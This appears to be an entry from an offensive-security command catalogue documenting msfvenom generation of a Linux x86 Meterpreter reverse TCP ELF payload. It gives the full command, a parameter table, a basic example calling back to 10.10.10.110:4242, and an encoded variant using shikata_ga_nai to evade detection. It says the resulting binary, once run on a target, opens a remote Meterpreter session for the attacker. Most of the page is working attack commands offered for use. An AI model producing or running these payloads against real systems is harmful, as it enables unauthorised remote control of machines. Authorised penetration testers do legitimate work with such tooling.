---
id: e9a1d152-c12d-4cf3-b538-8f579046c7ee
name: msfvenom-generate-linux-x86-meterpreter-reverse-tcp-elf
type: command
executor: bash
data: >-
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT"
  -f elf > $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275188+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Linux
tags:
  - meterpreter
  - reverse-tcp
  - payload-generation
verified: true
validated: true
---

# msfvenom-generate-linux-x86-meterpreter-reverse-tcp-elf

## Command

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f elf > $_OUTPUT_FILE
```

## Description

This command uses msfvenom to generate a Linux x86 Meterpreter reverse TCP payload in ELF format, creating an executable binary that connects back to the specified host and port for remote access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p linux/x86/meterpreter/reverse_tcp | Specifies the payload type for Linux x86 reverse Meterpreter | Yes |
| LHOST="$_LHOST" | Attacker's IP address for the reverse connection | Yes |
| LPORT="$_LPORT" | Port on the attacker machine to listen on | Yes |
| -f elf | Output format as ELF executable | Yes |
| > $_OUTPUT_FILE | Redirects output to the specified file (e.g., shell.elf) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
```

### Advanced Usage

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf -e x86/shikata_ga_nai > encoded_shell.elf
```

## Expected Output

The command runs silently and creates the ELF file. Verify with:

```bash
ls -la shell.elf
-rwxr-xr-x 1 user user 36864 Oct 10 12:00 shell.elf
```

Success is indicated by the file creation without errors. Upon execution on target, it connects to the listener, showing a Meterpreter session.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
